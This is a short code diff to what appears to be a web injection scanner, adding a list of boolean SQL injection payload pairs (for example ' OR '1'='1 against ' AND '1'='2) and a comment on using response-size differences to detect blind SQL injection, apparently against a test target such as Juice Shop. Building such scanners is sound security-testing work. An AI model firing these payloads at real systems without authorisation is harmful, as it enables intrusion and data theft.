@@ -66,6 +66,19 @@ BOOLEAN_PAIRS = [
     ("')) UNION SELECT NULL-- -", "')) UNION SELECT NULL WHERE 1=2-- -"),
 ]
 
+# Boolean OR/AND *amplification* pairs (Nuclei-style postfix fuzzing). Appended
+# to the original value: the OR-true form makes the WHERE clause always true so
+# the endpoint returns MORE rows (response grows vs baseline); the AND-false
+# form makes it always false so it returns fewer/none (response shrinks). The
+# asymmetry (OR >> baseline >> AND) is a strong boolean-SQLi signal that works
+# even when the app never emits an error.
+BOOLEAN_AMPLIFY_PAIRS = [
+    ("' OR '1'='1", "' AND '1'='2"),
+    (" OR 1=1-- -", " AND 1=2-- -"),
+    ("') OR ('1'='1", "') AND ('1'='2"),
+    ("' OR '1'='1'-- -", "' AND '1'='2'-- -"),
+]
+
 # NoSQL injection — boolean true/false pairs. A "true" payload should return
 # data (match), the "false" should return none. Covers MongoDB/MarsDB (Juice
 # Shop uses MarsDB for order tracking), which sqlmap does not test.
